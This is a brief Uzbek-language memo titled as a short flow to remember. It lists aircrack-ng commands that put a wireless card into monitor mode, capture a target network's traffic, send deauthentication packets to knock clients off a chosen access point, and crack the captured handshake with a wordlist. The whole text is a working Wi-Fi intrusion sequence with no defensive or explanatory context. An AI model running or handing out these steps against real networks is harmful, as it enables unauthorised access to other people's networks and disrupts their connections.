# 🔥 Qisqa flow (eslab qolish uchun)

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c [kanal] --bssid [MAC] -w file wlan0mon
aireplay-ng --deauth 10 -a [MAC] wlan0mon
aircrack-ng -w wordlist.txt file.cap
```

